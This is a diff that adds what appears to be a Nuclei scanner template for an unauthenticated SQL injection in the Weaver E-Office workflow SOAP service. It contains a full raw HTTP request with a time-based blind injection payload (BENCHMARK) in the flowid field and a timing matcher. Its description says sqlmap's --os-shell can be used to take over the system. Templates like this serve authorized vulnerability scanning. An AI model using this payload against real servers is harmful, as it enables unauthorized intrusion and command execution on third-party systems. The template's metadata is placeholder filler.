@@ -1,0 +1,45 @@
+id: weaver-eoffice-workflow-sqli
+
+info:
+  name: weaver-eoffice-workflow-sqli
+  author: high
+  severity: high
+  description: 泛微-EOffice系统存在未授权的wsdl接口泄露，将接口xml解析后，多个接口模块中的多个参数未经过滤，存在sql注入漏洞，可使用sqlmap中--os-shell参数执行系统命令，从而获取系统权限。可使用 burp wsdler进行测试
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /webservice/workflow/workflow.wsdl.php HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: LOGIN_LANG=cn
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+        SOAPAction: urn:WorkflowServicewsdl#getFormData
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 574
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:WorkflowServicewsdl">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <urn:getFormData soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                 <flowid xsi:type="xsd:string">gero et' AND 4772=BENCHMARK(2000000,MD5(0x676a4457))-- RGkQ</flowid>
+                 <runid xsi:type="xsd:string">sonoras imperio</runid>
+              </urn:getFormData>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=4'
+          - 'status_code == 200'
+        condition: and
